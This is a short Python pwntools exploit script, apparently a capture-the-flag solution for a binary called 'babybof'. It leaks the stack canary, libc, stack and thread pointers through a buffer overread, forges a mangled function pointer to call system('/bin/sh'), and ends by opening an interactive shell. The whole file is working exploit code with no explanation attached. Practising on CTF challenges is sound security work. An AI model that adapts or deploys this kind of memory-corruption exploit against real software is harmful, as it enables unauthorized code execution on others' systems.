from pwn import *

  

elf = ELF('./babybof', checksec=False)
libc = ELF('./lib/libc.so.6', checksec=False)
context.arch = 'amd64'
global p

def send_data(data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", data)
    p.recvuntil(b"You say : ")
    return p.recvuntil(b"\nI", drop=True)
  
def rol11(value):
    res = (value << 0x11 % 64) & (2**64 - 1) | ((value & (2**64-1)) >> (64-(0x11%64)))
    return res
  
def leak_pointer(offset):
    return send_data(b"A"*offset).split(b"\n")[1]
  

p = process(elf.path)
  
canary = u64(leak_pointer(72).rjust(8,b"\0"))
info("canary @0x%hx" % canary)

  

libc_leak = u64(leak_pointer(1767).ljust(8,b"\0"))
libc.address = libc_leak - 0x1d5580
libc.address += 0x1000
info("libc @0x%hx" % libc.address)
  

stack = u64(leak_pointer(1903).ljust(8,b"\0"))
info("stack @0x%hx" % stack)


pointer_thread = u64(leak_pointer(1951).ljust(8,b"\0")) # get the thing that make us crash 
info("Pointer thread @0x%hx" % pointer_thread)

val = rol11(libc.sym.system ^ 0)
payload = p64(val)
payload += p64(next(libc.search(b"/bin/sh")))*8
payload += p64(canary)*208
payload += p64(stack)*27
payload += p64(pointer_thread)
payload += p64(0)*8 # spray xor key just in case layout different in remote

send_data(payload)

p.sendlineafter(b"> ", b"2")

  

p.interactive()
